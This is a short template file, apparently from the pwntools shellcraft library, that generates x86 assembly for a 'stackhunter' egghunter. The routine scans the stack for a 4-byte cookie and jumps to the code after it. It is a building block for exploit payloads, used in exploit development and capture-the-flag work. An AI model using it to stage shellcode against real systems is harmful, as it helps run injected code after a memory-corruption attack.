<% from pwnlib.shellcraft import common %>
<%page args="cookie = 0x7afceb58"/>
<%docstring>
    stackhunter(cookie = 0x7afceb58)

    Returns an an egghunter, which searches from esp and upwards
    for a cookie. However to save bytes, it only looks at a single
    4-byte alignment. Use the function stackhunter_helper to
    generate a suitable cookie prefix for you.

    The default cookie has been chosen, because it makes it possible
    to shave a single byte, but other cookies can be used too.
</%docstring>
<% stackhunter = common.label("stackhunter") %>
%if (cookie & 0xffffff) == 0xfceb58:
${stackhunter}:
    cmp dword eax, ${hex(cookie)}
    jne ${stackhunter}+1
    jmp esp
%else:
${stackhunter}:
    pop eax
    cmp dword eax, ${hex(cookie)}
    jne ${stackhunter}
    jmp esp
%endif
